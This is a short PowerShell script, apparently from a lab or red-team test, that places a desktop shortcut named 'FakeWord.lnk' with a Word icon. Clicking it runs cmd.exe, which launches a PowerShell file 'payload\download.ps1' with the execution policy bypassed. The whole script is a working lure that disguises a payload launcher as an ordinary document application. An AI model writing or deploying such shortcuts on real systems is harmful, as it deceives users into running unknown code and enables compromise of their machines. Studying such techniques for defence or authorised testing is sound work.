$WScriptShell = New-Object -ComObject WScript.Shell
$desktop = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "FakeWord.lnk")
$shortcut = $WScriptShell.CreateShortcut($desktop)
$shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$shortcut.Arguments = "/c powershell -ExecutionPolicy Bypass -File C:\Users\Administrator\Desktop\test\payload\download.ps1"
$shortcut.IconLocation = "C:\Users\Administrator\Desktop\Word_2013_23473.ico"
$shortcut.Save()
